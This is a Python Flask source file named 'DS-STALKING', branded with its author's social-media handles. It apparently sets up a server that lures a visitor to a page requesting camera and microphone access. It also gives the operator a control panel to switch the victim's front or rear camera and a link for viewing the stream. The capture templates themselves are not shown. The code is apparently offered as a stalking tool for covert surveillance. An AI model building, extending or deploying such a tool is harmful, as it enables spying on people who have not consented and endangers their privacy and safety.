from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet
import random

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)

# Variable globale pour stocker la caméra active (avant ou arrière)
camera_mode = "rear"  # Par défaut, la caméra arrière

# Obtenir un port aléatoire dans une plage spécifique
def get_random_port(start=1024, end=65535):
    return random.randint(start, end)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

@app.route("/")
def home():
    # Page d'accueil
    return render_template("home.html")

@app.route("/camera")
def camera():
    # Page pour demander l'accès à la caméra et au micro
    return render_template("camera.html")

@app.route("/control")
def control():
    # Page pour contrôler les données transmises et changer de caméra
    return render_template("control.html")

@app.route("/change_camera", methods=["POST"])
def change_camera():
    global camera_mode
    # Basculer entre "front" (caméra avant) et "rear" (caméra arrière)
    camera_mode = request.json.get("mode", "rear")
    return jsonify({"status": "success", "current_mode": camera_mode})

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port
    local_ip = get_local_ip()
    stream_url = f"http://{local_ip}:{port}/view_stream"
    return jsonify({"stream_url": stream_url, "camera_mode": camera_mode})

@app.route("/view_stream")
def view_stream():
    # Page pour afficher le flux vidéo
    return render_template("view_stream.html", camera_mode=camera_mode)

if __name__ == "__main__":
    # Générer un port dynamique
    port = get_random_port()
    local_ip = get_local_ip()
    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")
    app.run(host="0.0.0.0", port=port)